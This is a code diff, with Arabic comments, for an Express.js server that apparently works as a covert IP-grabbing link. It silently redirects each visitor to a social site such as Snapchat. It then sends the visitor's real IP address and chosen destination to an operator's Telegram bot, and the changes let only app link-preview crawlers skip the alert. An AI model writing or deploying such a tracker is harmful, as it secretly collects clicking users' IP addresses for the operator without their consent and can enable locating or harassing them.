@@ -1,8 +1,9 @@
 const express = require('express');
+const https = require('https'); // استخدام مكتبة النظام لضمان استقرار الإرسال
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// 1. تجاهل طلبات الأيقونات وملفات النظام تلقائياً
+// 1. تجاهل طلبات الأيقونات وملفات النظام تلقائياً لمنع التكرار والرسائل العشوائية
 app.use((req, res, next) => {
     if (req.url.includes('favicon.ico') || req.url.includes('robots.txt')) {
         return res.status(204).end();
@@ -11,7 +12,7 @@ app.use((req, res, next) => {
 });
 
 app.get('*', async (req, res) => {
-    // التعديل الأول: جلب الآي بي الحقيقي والصافي للزائر (مخصص لـ Vercel)
+    // جلب الآي بي الحقيقي للزائر
     const xRealIp = req.headers['x-real-ip'];
     const xForwardedFor = req.headers['x-forwarded-for'];
     const visitorIp = xRealIp || (xForwardedFor ? xForwardedFor.split(',')[0].trim() : req.socket.remoteAddress);
@@ -39,27 +40,31 @@ app.get('*', async (req, res) => {
         destinationName = 'Snapchat';
     }
 
-    // التوجيه الفوري
+    // التوجيه الفوري والصامت للزائر دون تأخير
     res.redirect(302, targetUrl);
 
-    // التعديل الثاني: قائمة حظر شاملة لبوتات فحص الروابط من التطبيقات
+    // 2. فلترة ذكية ومتوازنة: حظر بوتات المعاينة الفورية للتطبيقات فقط
     const userAgent = (req.headers['user-agent'] || '').toLowerCase();
-    const isBot = userAgent.includes('bot') || 
-                  userAgent.includes('spider') || 
-                  userAgent.includes('crawl') ||
-                  userAgent.includes('facebookexternalhit') || // يمنع سيرفرات انستغرام وفيسبوك
-                  userAgent.includes('whatsapp') ||            // يمنع سيرفرات واتساب
-                  userAgent.includes('snapchat') ||            // يمنع سيرفرات سناب شات
-                  userAgent.includes('telegram') ||            // يمنع سيرفرات تليجرام
-                  userAgent.includes('vercel');                // يمنع فحص سيرفرات Vercel
+    const isBot = userAgent.includes('facebookexternalhit') || // سيرفرات فيسبوك وإنستغرام
+                  userAgent.includes('telegrambot') ||          // بوتات تليجرام المباشرة
+                  userAgent.includes('twitterbot') ||           // سيرفرات إكس
+                  userAgent.includes('slackbot');               // سيرفرات سلاك
 
+    // إذا لم يكن بوتاً لتطبيق، أرسل التنبيه فوراً
     if (!isBot && visitorIp) {
         const token = process.env.TELEGRAM_TOKEN;
         const chatId = process.env.TELEGRAM_CHAT_ID;
         
         if (token && chatId) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`🚨 New Visitor!\nTo: ${destinationName}\nIP: ${visitorIp}`)}`)
-            .catch(() => {});
+            const messageText = `🚨 New Visitor!\nTo: ${destinationName}\nIP: ${visitorIp}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`;
+            
+            // استخدام طريقة الإرسال المستقرة عبر طلب GET بسيط
+            https.get(url, (response) => {
+                // تم الطلب بنجاح في الخلفية
+            }).on('error', (e) => {
+                console.error("Telegram Send Error:", e);
+            });
         }
     }
 });
